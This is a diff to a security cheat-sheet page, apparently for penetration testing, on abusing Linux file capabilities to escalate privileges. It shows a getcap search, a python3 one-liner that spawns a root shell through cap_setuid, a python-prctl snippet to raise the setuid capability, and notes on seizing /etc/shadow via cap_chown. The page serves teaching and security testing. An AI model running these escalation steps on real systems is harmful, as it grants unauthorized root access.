@@ -77,8 +77,24 @@ Find executables with capabilities
 
 ```ps
 $ getcap -r / 2>/dev/null
-/usr/bin/python3 = cap_setuid
+/usr/bin/python3 = cap_setuid+ep
 $ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
+
+⚠️ Capabilities are often followed by `+` and a modifier.
+
+* Effective (`e`): applied on the process only
+* Permitted (`p`): the process can use or drop permissions
+* Inheritable (`i`): inherited by child processes
+
+To retain permitted capabilities when creating a new process, refer to [this thread](https://stackoverflow.com/questions/12141420/losing-capabilities-after-setuid). In Python, you could use [python-prctl](https://pythonhosted.org/python-prctl/).
+
+```py
+# Example: can now use setuid with only +p
+# sudo apt install libcap-dev
+# pip install python-prctl
+import prctl
+prctl.cap_effective.setuid=True
 ```
 
 ➡️ Look for the executable on [GTFOBins](../tools/gtfobins.md)
@@ -89,6 +105,7 @@ $ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 There are roughly 40 capabilities:
 
 * `cap_chown`: could take over `/etc/shadow` to edit a password
+* `cap_setuid`: could set the current user to be root (`0`)
 </div></div>
 
 <hr class="sep-both">
